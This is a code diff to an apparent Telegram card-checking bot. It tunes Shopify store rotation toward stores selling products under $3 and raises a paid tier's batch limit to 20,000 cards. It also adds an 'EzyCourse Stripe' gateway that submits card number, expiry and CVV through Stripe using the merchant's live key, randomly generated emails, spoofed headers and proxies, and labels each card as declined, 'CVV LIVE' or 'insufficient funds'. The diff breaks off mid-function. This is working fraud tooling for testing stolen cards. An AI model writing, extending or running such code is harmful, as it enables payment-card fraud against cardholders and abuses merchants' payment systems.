@@ -10260,7 +10260,7 @@ class ShopifyAPIPool:
                 # ============ CHECK IF SITE IS GOOD (PROTECTED) ============
                 # GOOD indicators - sites that return these are NEVER removed
                 good_indicators = [
-                    "CARD_DECLINED", "OTP_REQUIRED", "3D REQUIRED",
+                    "CARD_DECLINED", "OTP_REQUIRED", " ORDER_PLACED", "3D REQUIRED",
                     "OTP", "3D", "CVV LIVE", "INSUFFICIENT FUNDS",
                     "ORDER_PLACED", "CHARGED", "ORDER COMPLETED"
                 ]
@@ -10362,12 +10362,12 @@ class ShopifyAPIPool:
                 
                 # ============ CHECK FOR RETRYABLE ERRORS ============
                 retryable_patterns = [
-                    "NO VALID PAYMENT METHOD FOUND", "UNKNOWN","FAILED TO GET SESSION TOKEN",
+                    "NO VALID PAYMENT METHOD FOUND", "No products under $3 found!", "No products", "UNKNOWN","FAILED TO GET SESSION TOKEN",
                     "DECISION_RULE_BLOCK", "Unable to get payment token: 422, message='Attempt", "Unable to get payment token: 422",
                     "CART FAILED WITH STATUS 422", "CART FAILED WITH STATUS 429","Cart failed with status 403",
                     "SITE ERROR! STATUS: 401", "SITE ERROR! STATUS: 402", "SITE ERROR! STATUS: 403",
                     "MERCHANDISE_EXPECTED_PRICE_MISMATCH","<b>No Valid Products</b>","VALIDATION_CUSTOM",
-                    "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED","No Valid Products","403",
+                    "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED","No Valid Products","403", "<b>No products under $3 found!</b>",
                     "INVALID_PAYMENT_METHOD", "Site not supported", "<b>No Valid Products</b>",
                     "NO VARIANTS", "GENERIC_ERROR", "No Valid Products","VALIDATION_CUSTOM",
                     "SITE DEAD", "PROXY DEAD", "CONNECTION ERROR", "TIMEOUT","Cart failed with status 403",
@@ -10671,7 +10671,7 @@ class ShopifyAPIPool:
             # ============ RETRYABLE ERRORS (try different site/api) ============
             retryable_patterns = [
                 "NO VALID PAYMENT METHOD FOUND", "FAILED TO GET SESSION TOKEN",
-                "DECISION_RULE_BLOCK",
+                "DECISION_RULE_BLOCK", "No products under $3 found!", "<b>No products under $3 found!</b>",
                 "CART FAILED WITH STATUS 422", "CART FAILED WITH STATUS 429",
                 "SITE ERROR! STATUS: 401", "SITE ERROR! STATUS: 402", "SITE ERROR! STATUS: 403",
                 "MERCHANDISE_EXPECTED_PRICE_MISMATCH",
@@ -13702,7 +13702,7 @@ class SiteTestCache:
 
 
 class AutosopiSiteManager:
-    """Enhanced site manager with true round-robin rotation and GOOD site priority"""
+    """Enhanced site manager with true round-robin rotation and GOOD site priority based on price"""
     
     def __init__(self, data_file=AUTOSOPI_SITES_FILE, pending_file=AUTOSOPI_PENDING_SITES_FILE):
         self.data_file = data_file
@@ -13718,7 +13718,7 @@ class AutosopiSiteManager:
         self._load_lock = asyncio.Lock()
         self._save_lock = asyncio.Lock()
         
-        # ============ NEW: Track rotation indices separately ============
+        # ============ ROTATION INDICES ============
         self.good_sites_index = 0
         self.normal_sites_index = 0
         self.last_used_site_type = "normal"  # Start with normal, then alternate
@@ -13886,31 +13886,61 @@ class AutosopiSiteManager:
         return f"https://{normalized}"
     
     def get_good_sites_list(self) -> List[str]:
-        """Get list of all GOOD sites (with products under $10)"""
-        good_sites = []
-        for site in self.sites:
-            if site not in self.sites_to_remove:
-                if site_quality_tracker.is_good_site(site):
-                    good_sites.append(site)
-        return good_sites
+        """
+        Get list of all GOOD sites sorted by price (lowest first)
+        Uses site_quality_tracker for price information
+        """
+        return site_quality_tracker.get_good_sites_sorted_by_price()
     
     def get_normal_sites_list(self) -> List[str]:
         """Get list of normal sites (not GOOD)"""
         normal_sites = []
+        good_sites = self.get_good_sites_list()
         for site in self.sites:
             if site not in self.sites_to_remove:
-                if not site_quality_tracker.is_good_site(site):
+                if site not in good_sites:
                     normal_sites.append(site)
         return normal_sites
+    
+    def _get_next_good_site(self, good_sites: list) -> str:
+        """
+        Get next GOOD site in rotation.
+        GOOD sites are already sorted by price (lowest first) from get_good_sites_list()
+        """
+        if not good_sites:
+            return None
+        
+        # Use the index to rotate through good sites
+        if self.good_sites_index >= len(good_sites):
+            self.good_sites_index = 0
+        
+        site = good_sites[self.good_sites_index]
+        self.good_sites_index += 1
+        
+        # Log the price for debugging
+        price = site_quality_tracker.get_site_price(site)
+        rank = site_quality_tracker.get_site_price_rank(site)
+        print(f"🌟 [SITE SELECTION] Using GOOD site #{self.good_sites_index}/{len(good_sites)}: {site} (${price:.2f}, rank #{rank})")
+        
+        return site
+    
+    def _get_next_normal_site(self, normal_sites: list) -> str:
+        """Get next normal site in round-robin rotation"""
+        if not normal_sites:
+            return None
+        
+        if self.normal_sites_index >= len(normal_sites):
+            self.normal_sites_index = 0
+        
+        site = normal_sites[self.normal_sites_index]
+        self.normal_sites_index += 1
+        
+        return site
     
     def get_next_site_weighted(self) -> str:
         """
         Get next site with TRUE ROUND-ROBIN rotation.
-        
-        Strategy:
-        - If we have GOOD sites, alternate between GOOD and normal sites
-        - This prevents hammering the same GOOD site for all cards
-        - Each type of site rotates internally
+        GOOD sites are sorted by price (lowest first)
         """
         if not self.sites:
             return None
@@ -13929,19 +13959,17 @@ class AutosopiSiteManager:
         if not available_sites:
             return None
         
-        # Separate GOOD sites from normal sites
-        good_sites = []
-        normal_sites = []
+        # Get GOOD sites sorted by price (lowest first)
+        good_sites = self.get_good_sites_list()
         
-        for site in available_sites:
-            if site_quality_tracker.is_good_site(site):
-                good_sites.append(site)
-            else:
-                normal_sites.append(site)
+        # Filter good_sites to only include available sites
+        good_sites = [site for site in good_sites if site in available_sites]
+        
+        # Get normal sites (not GOOD)
+        normal_sites = [site for site in available_sites if site not in good_sites]
         
         # ============ ALTERNATING ROTATION STRATEGY ============
-        # If we have GOOD sites, alternate between GOOD and normal
-        # This spreads the load and prevents rate limiting
+        # If we have GOOD sites, alternate between GOOD (lowest price first) and normal
         
         if good_sites and normal_sites:
             # Alternate between GOOD and normal sites
@@ -13952,16 +13980,18 @@ class AutosopiSiteManager:
                 print(f"🔄 [SITE SELECTION] Alternating: Using normal site (#{self.normal_sites_index}/{len(normal_sites)}): {site}")
                 return site
             else:
-                # Use a GOOD site next
+                # Use a GOOD site next (lowest price first)
                 site = self._get_next_good_site(good_sites)
                 self.last_used_site_type = "good"
-                print(f"🌟 [SITE SELECTION] Alternating: Using GOOD site (#{self.good_sites_index}/{len(good_sites)}): {site}")
+                price = site_quality_tracker.get_site_price(site)
+                print(f"🌟 [SITE SELECTION] Alternating: Using GOOD site (#{self.good_sites_index}/{len(good_sites)}): {site} (${price:.2f})")
                 return site
         
         elif good_sites:
-            # Only GOOD sites available - rotate through them
+            # Only GOOD sites available - rotate through them (lowest price first)
             site = self._get_next_good_site(good_sites)
-            print(f"🌟 [SITE SELECTION] Only GOOD sites: Using #{self.good_sites_index}/{len(good_sites)}: {site}")
+            price = site_quality_tracker.get_site_price(site)
+            print(f"🌟 [SITE SELECTION] Only GOOD sites: Using #{self.good_sites_index}/{len(good_sites)}: {site} (${price:.2f})")
             return site
         
         elif normal_sites:
@@ -13971,32 +14001,6 @@ class AutosopiSiteManager:
             return site
         
         return None
-    
-    def _get_next_good_site(self, good_sites: list) -> str:
-        """Get next GOOD site in round-robin rotation"""
-        if not good_sites:
-            return None
-        
-        if self.good_sites_index >= len(good_sites):
-            self.good_sites_index = 0
-        
-        site = good_sites[self.good_sites_index]
-        self.good_sites_index += 1
-        
-        return site
-    
-    def _get_next_normal_site(self, normal_sites: list) -> str:
-        """Get next normal site in round-robin rotation"""
-        if not normal_sites:
-            return None
-        
-        if self.normal_sites_index >= len(normal_sites):
-            self.normal_sites_index = 0
-        
-        site = normal_sites[self.normal_sites_index]
-        self.normal_sites_index += 1
-        
-        return site
     
     def reset_rotation(self):
         """Reset all rotation indices"""
@@ -14104,6 +14108,16 @@ class AutosopiSiteManager:
                     del self.site_stats[existing_site]
                 if existing_site in self.sites_to_remove:
                     self.sites_to_remove.remove(existing_site)
+                # Also remove from site_quality_tracker
+                if existing_site in site_quality_tracker.good_sites:
+                    site_quality_tracker.good_sites.remove(existing_site)
+                if existing_site in site_quality_tracker.bad_sites:
+                    site_quality_tracker.bad_sites.remove(existing_site)
+                if existing_site in site_quality_tracker.site_quality:
+                    del site_quality_tracker.site_quality[existing_site]
+                if existing_site in site_quality_tracker.price_cache:
+                    del site_quality_tracker.price_cache[existing_site]
+                site_quality_tracker.save_stats()
                 self.save_sites()
                 self.reset_rotation()
                 return True, f"✅ Site removed: {existing_site}"
@@ -14156,15 +14170,17 @@ class AutosopiSiteManager:
             added_by = stats.get('added_by_name', 'Unknown')
             
             is_good = site_quality_tracker.is_good_site(site)
+            price = site_quality_tracker.get_site_price(site)
             good_star = "🌟 " if is_good else ""
+            price_display = f" (${price:.2f})" if price > 0 else ""
             
             if total > 0:
                 success_rate = (successes / total) * 100 if total > 0 else 0
-                result += f"{i}. {good_star}<code>{site}</code>\n"
+                result += f"{i}. {good_star}<code>{site}</code>{price_display}\n"
                 result += f"   📊 {success_rate:.1f}% ({successes}/{total}) | ✅ {successes} | ⚠️ {errors}\n"
                 result += f"   👤 Added by: {added_by}\n"
             else:
-                result += f"{i}. {good_star}<code>{site}</code>\n"
+                result += f"{i}. {good_star}<code>{site}</code>{price_display}\n"
                 result += f"   👤 Added by: {added_by}\n"
         
         return result
@@ -14199,6 +14215,33 @@ class AutosopiSiteManager:
         except Exception as e:
             return False, f"❌ Error: {str(e)[:50]}"
     
+    async def test_all_sites_parallel(self) -> dict:
+        """Test all sites in parallel"""
+        results = {}
+        tasks = []
+        
+        for site in self.sites:
+            task = asyncio.create_task(self.test_site(site))
+            tasks.append((site, task))
+        
+        for site, task in tasks:
+            try:
+                is_working, message = await task
+                results[site] = (is_working, message)
+            except Exception as e:
+                results[site] = (False, f"Error: {str(e)[:50]}")
+        
+        # Remove dead sites
+        for site, (is_working, _) in results.items():
+            if not is_working:
+                # Mark as failed
+                self.site_failures[site] = self.site_failures.get(site, 0) + 1
+                if self.site_failures[site] >= 3:
+                    self.remove_site(site, OWNER_ID)
+        
+        self.save_sites()
+        return results
+    
     def get_stats_summary(self) -> dict:
         """Get summary statistics about sites"""
         total_sites = len(self.sites)
@@ -14218,7 +14261,12 @@ class AutosopiSiteManager:
     async def close(self):
         """Clean up resources"""
         await self.test_pool.close_all()
-
+    
+    # ============ LEGACY METHODS FOR BACKWARD COMPATIBILITY ============
+    
+    def get_next_site(self) -> str:
+        """Legacy method - use get_next_site_weighted() instead"""
+        return self.get_next_site_weighted()
 
 # Create global instance
 autosopi_site_manager = AutosopiSiteManager()
@@ -15056,7 +15104,7 @@ class UserManager:
         },
         "ultimate": {
             "max_checks_per_day": 1000000,
-            "max_batch_size": 5000,
+            "max_batch_size": 20000,
             "can_use_proxy": True,
             "can_access_gateways": [
                 "shopify", "auto_stripe", "adyen_direct", "paypal", "stripe_charge_v2","adyen","stripe_pl",
@@ -17677,8 +17725,1072 @@ async def quick_proxy_test_command(update: Update, context: ContextTypes.DEFAULT
     )
     
     await status_msg.edit_text(result_msg, parse_mode=ParseMode.HTML, reply_markup=back_menu())
-    
+  
+  
+# ============ EZYCOURSE STRIPE GATEWAY - FIXED ============
+# Add this to your f13.py
 
+import requests
+import re
+import time
+import random
+import base64
+import json
+import asyncio
+import traceback
+from typing import Dict, Tuple, Optional, List
+from datetime import datetime
+from faker import Faker
+from user_agent import generate_user_agent
+
+# Active tasks for EzyCourse Stripe
+ezycourse_active_tasks = {}
+
+# ============ EZYCOURSE CONFIG ============
+EZYCOURSE_STRIPE_KEY = "pk_live_51NMHTlLvIw0k1EPu80ivQ0HYQ9NUotEncPEpUYYytP8YkUPB4vNGYICv1rB5Emf6nD1UzKXd0wKzdXnumGJqYPDt00Huwrpsfq"
+EZYCOURSE_API_URL = "https://ezycourse.com/api/ezycourse/onboarding/create-setup-intent"
+EZYCOURSE_SIGNUP_URL = "https://ezycourse.com/signup?plan=pro&interval=month&trial=true"
+
+def generate_ezycourse_email():
+    """Generate random email for EzyCourse"""
+    first_names = ["ahmed", "mohamed", "ali", "omar", "youssef", "khaled", "abdullah", "fatma", "sara", "nour", "lina", "maya", "hala", "reem", "salma", "amr", "tarek", "hassan", "ibrahim", "karim"]
+    last_names = ["hassan", "ahmed", "mohamed", "ali", "ibrahim", "khalil", "said", "ramadan", "elmasry", "abdallah", "fathy", "tarek", "mostafa", "adel", "gamal"]
+    domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "icloud.com", "protonmail.com", "live.com", "msn.com", "aol.com", "mail.com"]
+    
+    f = random.choice(first_names)
+    l = random.choice(last_names)
+    n = random.randint(10, 9999)
+    
+    patterns = [
+        f"{f}.{l}{n}",
+        f"{f}{l}{n}",
+        f"{f}_{l}{n}",
+        f"{f}{n}",
+        f"{l}.{f}{n}",
+        f"{f}{l}.{n}",
+        f"{f}.{l}.{n}",
+        f"{f}{random.randint(1980, 2005)}"
+    ]
+    
+    return f"{random.choice(patterns)}@{random.choice(domains)}".lower()
+
+
+async def check_card_ezycourse(card: str, proxy: str = None, user_id: int = None, retry_count: int = 0) -> Dict:
+    """
+    Check card using EzyCourse Stripe gateway
+    This creates a payment method and setup intent for subscription
+    """
+    print(f"\n{'='*80}")
+    print(f"💳 [EZYCOURSE STRIPE] Checking card: {card[:20]}...")
+    if proxy:
+        print(f"🔌 Using proxy: {mask_proxy(proxy)}")
+    else:
+        print(f"🔌 No proxy - direct connection")
+    if retry_count > 0:
+        print(f"🔄 RETRY ATTEMPT #{retry_count}")
+    print(f"{'='*80}")
+    
+    default_result = {
+        "status": "error",
+        "result": "UNKNOWN_ERROR",
+        "message": "Unknown error occurred",
+        "status_display": "⚠️ ERROR",
+        "status_category": "error",
+        "elapsed": 0,
+        "price": "$0.00",
+        "gateway": "EzyCourse Stripe"
+    }
+    
+    try:
+        # Parse card
+        parts = card.split('|')
+        if len(parts) != 4:
+            return {
+                "status": "error",
+                "result": "INVALID_FORMAT",
+                "message": "Invalid card format. Use: NUMBER|MM|YYYY|CVV",
+                "status_display": "⚠️ INVALID FORMAT",
+                "status_category": "error"
+            }
+        
+        cc, mm, yy, cvv = parts
+        
+        # Format year (API expects 2-digit)
+        if len(yy) == 4:
+            yy = yy[2:]
+        
+        # Generate email
+        email = generate_ezycourse_email()
+        print(f"📧 Email: {email}")
+        
+        # Setup session with proxy
+        session = requests.Session()
+        if proxy:
+            proxy_url = format_proxy(proxy)
+            if proxy_url:
+                session.proxies = {'http': proxy_url, 'https': proxy_url}
+                print(f"🔧 Using proxy: {mask_proxy(proxy_url)}")
+        
+        start_time = time.time()
+        
+        # ============ STEP 1: Create Payment Method ============
+        print(f"\n📡 [STEP 1] Creating Stripe payment method...")
+        
+        headers_pm = {
+            'authority': 'api.stripe.com',
+            'accept': 'application/json',
+            'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://js.stripe.com',
+            'referer': 'https://js.stripe.com/',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': generate_user_agent(),
+        }
+        
+        pm_data = {
+            'type': 'card',
+            'card[number]': cc,
+            'card[cvc]': cvv,
+            'card[exp_month]': mm,
+            'card[exp_year]': yy,
+            'payment_user_agent': 'stripe.js/19f3ad3143; stripe-js-v3/19f3ad3143; card-element',
+            'key': EZYCOURSE_STRIPE_KEY,
+        }
+        
+        response_pm = session.post(
+            'https://api.stripe.com/v1/payment_methods',
+            headers=headers_pm,
+            data=pm_data,
+            timeout=30
+        )
+        
+        if response_pm.status_code != 200:
+            print(f"❌ Payment method creation failed: HTTP {response_pm.status_code}")
+            print(f"Response: {response_pm.text[:200]}")
+            
+            try:
+                error_data = response_pm.json()
+                error_msg = error_data.get('error', {}).get('message', 'Unknown error')
+                return parse_ezycourse_error(error_msg, time.time() - start_time)
+            except:
+                default_result["message"] = "Failed to create payment method"
+                default_result["elapsed"] = time.time() - start_time
+                return default_result
+        
+        pm_result = response_pm.json()
+        payment_method_id = pm_result.get('id')
+        
+        if not payment_method_id:
+            print("❌ No payment method ID")
+            default_result["message"] = "No payment method ID"
+            default_result["elapsed"] = time.time() - start_time
+            return default_result
+        
+        print(f"✅ Payment method created: {payment_method_id}")
+        
+        # ============ STEP 2: Create Setup Intent ============
+        print(f"\n📡 [STEP 2] Creating setup intent...")
+        
+        headers_si = {
+            'authority': 'ezycourse.com',
+            'accept': 'application/json, text/plain, */*',
+            'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
+            'content-type': 'application/json',
+            'origin': 'https://ezycourse.com',
+            'referer': EZYCOURSE_SIGNUP_URL,
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': generate_user_agent(),
+        }
+        
+        si_data = {
+            'stripe_payment_method_uuid': payment_method_id,
+            'is_trial': True,
+        }
+        
+        response_si = session.post(
+            EZYCOURSE_API_URL,
+            headers=headers_si,
+            json=si_data,
+            timeout=30
+        )
+        
+        print(f"📥 Setup intent status: {response_si.status_code}")
+        
+        # ============ FIX: Better error handling for setup intent ============
+        if response_si.status_code != 200:
+            print(f"❌ Setup intent failed: HTTP {response_si.status_code}")
+            
+            try:
+                error_data = response_si.json()
+                error_msg = error_data.get('message', error_data.get('error', 'Unknown error'))
+                print(f"📥 Error response: {error_data}")
+                
+                # Parse error message for card issues
+                error_lower = str(error_msg).lower()
+                
+                if "declined" in error_lower or "card_declined" in error_lower:
+                    return {
+                        "status": "declined",
+                        "result": "DECLINED",
+                        "message": f"Card declined: {error_msg}",
+                        "status_display": "❌ DECLINED",
+                        "status_category": "declined",
+                        "elapsed": time.time() - start_time,
+                        "price": "$0.00",
+                        "gateway": "EzyCourse Stripe"
+                    }
+                elif "insufficient" in error_lower or "funds" in error_lower or "balance" in error_lower:
+                    return {
+                        "status": "success",
+                        "result": "INSUFFICIENT_FUNDS",
+                        "message": f"Insufficient funds: {error_msg}",
+                        "status_display": "💰 INSUFFICIENT FUNDS",
+                        "status_category": "approved",
+                        "elapsed": time.time() - start_time,
+                        "price": "$0.00",
+                        "gateway": "EzyCourse Stripe"
+                    }
+                elif "cvv" in error_lower or "security" in error_lower or "cvc" in error_lower:
+                    return {
+                        "status": "success",
+                        "result": "CVV_LIVE",
+                        "message": f"CVV verification failed: {error_msg}",
+                        "status_display": "✅ CVV LIVE",
+                        "status_category": "approved",
+                        "elapsed": time.time() - start_time,
+                        "price": "$0.00",
+                        "gateway": "EzyCourse Stripe"
+                    }
+                elif "expired" in error_lower:
+                    return {
+                        "status": "declined",
+                        "result": "EXPIRED",
+                        "message": f"Expired card: {error_msg}",
+                        "status_display": "❌ EXPIRED",
+                        "status_category": "declined",
+                        "elapsed": time.time() - start_time,
+                        "price": "$0.00",
+                        "gateway": "EzyCourse Stripe"
+                    }
+                elif "3d" in error_lower or "secure" in error_lower or "authentication" in error_lower:
+                    return {
+                        "status": "declined",
+                        "result": "3DS_REQUIRED",
+                        "message": f"3D Secure required: {error_msg}",
+                        "status_display": "🔐 3DS REQUIRED",
+                        "status_category": "approved",
+                        "elapsed": time.time() - start_time,
+                        "price": "$0.00",
+                        "gateway": "EzyCourse Stripe"
+                    }
+                else:
+                    return {
+                        "status": "declined",
+                        "result": "DECLINED",
+                        "message": error_msg,
+                        "status_display": "❌ DECLINED",
+                        "status_category": "declined",
+                        "elapsed": time.time() - start_time,
+                        "price": "$0.00",
+                        "gateway": "EzyCourse Stripe"
+                    }
+            except json.JSONDecodeError:
+                pass
+            
+            default_result["message"] = f"Setup intent failed: HTTP {response_si.status_code}"
+            default_result["elapsed"] = time.time() - start_time
+            return default_result
+        
+        # Parse setup intent response
+        try:
+            si_result = response_si.json()
+        except json.JSONDecodeError:
+            print("❌ Invalid JSON response from setup intent")
+            default_result["message"] = "Invalid JSON response"
+            default_result["elapsed"] = time.time() - start_time
+            return default_result
+        
+        setup_intent_id = si_result.get('id')
+        client_secret = si_result.get('client_secret')
+        
+        if not setup_intent_id or not client_secret:
+            print("❌ No setup intent ID or client secret")
+            print(f"Response: {si_result}")
+            default_result["message"] = "No setup intent data"
+            default_result["elapsed"] = time.time() - start_time
+            return default_result
+        
+        print(f"✅ Setup intent created: {setup_intent_id}")
+        print(f"✅ Client secret: {client_secret[:30]}...")
+        
+        # ============ STEP 3: Confirm Setup Intent ============
+        print(f"\n🔥 [STEP 3] Confirming setup intent...")
+        
+        headers_confirm = {
+            'authority': 'api.stripe.com',
+            'accept': 'application/json',
+            'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://js.stripe.com',
+            'referer': 'https://js.stripe.com/',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': generate_user_agent(),
+        }
+        
+        confirm_data = {
+            'expected_payment_method_type': 'card',
+            'use_stripe_sdk': 'true',
+            'key': EZYCOURSE_STRIPE_KEY,
+            'client_secret': client_secret,
+        }
+        
+        response_confirm = session.post(
+            f'https://api.stripe.com/v1/setup_intents/{setup_intent_id}/confirm',
+            headers=headers_confirm,
+            data=confirm_data,
+            timeout=30
+        )
+        
+        elapsed = time.time() - start_time
+        
+        try:
+            result = response_confirm.json()
+        except json.JSONDecodeError:
+            print("❌ Invalid JSON response from confirm")
+            default_result["message"] = "Invalid JSON response"
+            default_result["elapsed"] = elapsed
+            return default_result
+        
+        print(f"\n📥 Payment Result:")
+        print(json.dumps(result, indent=2)[:500])
+        
+        # ============ STEP 4: Parse Result ============
+        if response_confirm.status_code == 200:
+            status = result.get('status')
+            
+            if status == 'succeeded':
+                print(f"\n✅✅✅ SETUP SUCCESSFUL! Card is LIVE ✅✅✅")
+                return {
+                    "status": "success",
+                    "result": "APPROVED",
+                    "message": "Setup intent succeeded - Card is LIVE",
+                    "status_display": "✅ CVV LIVE",
+                    "status_category": "approved",
+                    "elapsed": elapsed,
+                    "price": "$0.00",
+                    "gateway": "EzyCourse Stripe",
+                    "payment_method_id": payment_method_id,
+                    "setup_intent_id": setup_intent_id
+                }
+            elif status == 'requires_action':
+                print(f"\n🔐 3D Secure required")
+                return {
+                    "status": "declined",
+                    "result": "3DS_REQUIRED",
+                    "message": "3D Secure required - Authentication needed",
+                    "status_display": "🔐 3DS REQUIRED",
+                    "status_category": "approved",
+                    "elapsed": elapsed,
+                    "price": "$0.00",
+                    "gateway": "EzyCourse Stripe"
+                }
+            elif 'error' in result:
+                return parse_ezycourse_error(result['error'], elapsed)
+            else:
+                return {
+                    "status": "declined",
+                    "result": "DECLINED",
+                    "message": f"Status: {status}",
+                    "status_display": "❌ DECLINED",
+                    "status_category": "declined",
+                    "elapsed": elapsed,
+                    "price": "$0.00",
+                    "gateway": "EzyCourse Stripe"
+                }
+        else:
+            if 'error' in result:
+                return parse_ezycourse_error(result['error'], elapsed)
+            return {
+                "status": "error",
+                "result": f"HTTP_{response_confirm.status_code}",
+                "message": f"HTTP Error: {response_confirm.status_code}",
+                "status_display": f"⚠️ HTTP {response_confirm.status_code}",
+                "status_category": "error",
+                "elapsed": elapsed,
+                "price": "$0.00",
+                "gateway": "EzyCourse Stripe"
+            }
+            
+    except requests.Timeout:
+        print(f"⏰ Request timeout")
+        default_result["message"] = "Request timeout"
+        default_result["elapsed"] = time.time() - start_time
+        return default_result
+    except requests.ConnectionError as e:
+        print(f"❌ Connection error: {e}")
+        default_result["message"] = f"Connection error: {str(e)[:50]}"
+        default_result["elapsed"] = time.time() - start_time
+        return default_result
+    except Exception as e:
+        print(f"❌ Error: {e}")
+        traceback.print_exc()
+        default_result["message"] = str(e)[:100]
+        default_result["elapsed"] = time.time() - start_time
+        return default_result
+
+
+def parse_ezycourse_error(error, elapsed):
+    """Parse EzyCourse/Stripe error response"""
+    if isinstance(error, dict):
+        error_msg = error.get('message', 'Unknown error')
+        error_code = error.get('code', '')
+        decline_code = error.get('decline_code', '')
+    else:
+        error_msg = str(error)
+        error_code = ''
+        decline_code = ''
+    
+    print(f"\n❌ Stripe Error: {error_msg}")
+    print(f"Code: {error_code}, Decline Code: {decline_code}")
+    
+    error_lower = str(error_msg).lower()
+    
+    if 'insufficient_funds' in error_lower or 'insufficient' in error_lower or 'funds' in error_lower:
+        return {
+            "status": "success",
+            "result": "INSUFFICIENT_FUNDS",
+            "message": f"Insufficient funds: {error_msg}",
+            "status_display": "💰 INSUFFICIENT FUNDS",
+            "status_category": "approved",
+            "elapsed": elapsed,
+            "price": "$0.00",
+            "gateway": "EzyCourse Stripe"
+        }
+    elif 'cvc' in error_lower or 'security' in error_lower or 'cvv' in error_lower:
+        return {
+            "status": "success",
+            "result": "CVV_LIVE",
+            "message": f"CVV verification failed: {error_msg}",
+            "status_display": "✅ CVV LIVE",
+            "status_category": "approved",
+            "elapsed": elapsed,
+            "price": "$0.00",
+            "gateway": "EzyCourse Stripe"
+        }
+    elif 'declined' in error_lower or 'card_declined' in error_lower:
+        return {
+            "status": "declined",
+            "result": "DECLINED",
+            "message": f"Card declined: {error_msg}",
+            "status_display": "❌ DECLINED",
+            "status_category": "declined",
+            "elapsed": elapsed,
+            "price": "$0.00",
+            "gateway": "EzyCourse Stripe"
+        }
+    elif 'expired' in error_lower:
+        return {
+            "status": "declined",
+            "result": "EXPIRED",
+            "message": f"Expired card: {error_msg}",
+            "status_display": "❌ EXPIRED",
+            "status_category": "declined",
+            "elapsed": elapsed,
+            "price": "$0.00",
+            "gateway": "EzyCourse Stripe"
+        }
+    elif '3d' in error_lower or 'secure' in error_lower or 'authentication' in error_lower:
+        return {
+            "status": "declined",
+            "result": "3DS_REQUIRED",
+            "message": f"3D Secure required: {error_msg}",
+            "status_display": "🔐 3DS REQUIRED",
+            "status_category": "approved",
+            "elapsed": elapsed,
+            "price": "$0.00",
+            "gateway": "EzyCourse Stripe"
+        }
+    else:
+        return {
+            "status": "declined",
+            "result": "DECLINED",
+            "message": error_msg,
+            "status_display": "❌ DECLINED",
+            "status_category": "declined",
+            "elapsed": elapsed,
+            "price": "$0.00",
+            "gateway": "EzyCourse Stripe"
+        }
+
+
+def format_ezycourse_response(result: Dict, card: str, bin_info: tuple) -> Tuple[str, str]:
+    """Format EzyCourse Stripe response for display"""
+    bin_info_text, bank, country, currency_code, country_code = bin_info
+    
+    status_display = result.get("status_display", "⚠️ UNKNOWN")
+    status_category = result.get("status_category", "unknown")
+    message = result.get("message", "Unknown")
+    elapsed = result.get("elapsed", 0)
+    gateway = result.get("gateway", "EzyCourse Stripe")
+    price = result.get("price", "$0.00")
+    
+    # Parse card for display
+    card_parts = card.split('|')
+    card_num = card_parts[0] if len(card_parts) > 0 else card
+    exp_month = card_parts[1] if len(card_parts) > 1 else "XX"
+    exp_year = card_parts[2] if len(card_parts) > 2 else "XX"
+    exp_year_short = exp_year[-2:] if len(exp_year) == 4 else exp_year
+    cvv = card_parts[3] if len(card_parts) > 3 else "XXX"
+    
+    # Clean message
+    clean_message = message[:80]
+    if len(message) > 80:
+        clean_message += "..."
+    
+    # Format country with flag
+    country_name = country.replace('🌐', '').strip()
+    flag_map = {
+        'USA': '🇺🇸', 'UNITED STATES': '🇺🇸', 'UK': '🇬🇧', 'CANADA': '🇨🇦',
+        'AUSTRALIA': '🇦🇺', 'INDIA': '🇮🇳', 'UAE': '🇦🇪'
+    }
+    country_flag = "🌍"
+    for key, flag in flag_map.items():
+        if key in country_name.upper():
+            country_flag = flag
+            break
+    
+    # Format bank name
+    bank_display = bank if bank != 'N/A' else "Unknown"
+    if len(bank_display) > 25:
+        bank_display = bank_display[:22] + "..."
+    
+    # Determine emoji based on status
+    if "CHARGED" in status_display:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["charged"], "🔥")
+        status_text = "CHARGED"
+    elif "INSUFFICIENT" in status_display:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["money"], "💰")
+        status_text = "INSUFFICIENT FUNDS"
+    elif "CVV LIVE" in status_display:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
+        status_text = "CVV LIVE"
+    elif "3D" in status_display or "3DS" in status_display:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["lock"], "🔐")
+        status_text = "3D REQUIRED"
+    elif "APPROVED" in status_display:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
+        status_text = "APPROVED"
+    else:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
+        status_text = "DECLINED"
+    
+    # Build output
+    ui = (
+        f"┏━━━━━━━⍟\n"
+        f"┃ {status_emoji} {status_text}\n"
+        f"┗━━━━━━━━━━━⊛\n\n"
+        f"[⌬] 𝐂𝐚𝐫𝐝 ↣ <code>{card_num}|{exp_month}|{exp_year_short}|{cvv}</code>\n"
+        f"[⌬] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ Stripe Auth\n"
+        f"[⌬] 𝐀𝐦𝐨𝐮𝐧𝐭 ↣ {price}\n"
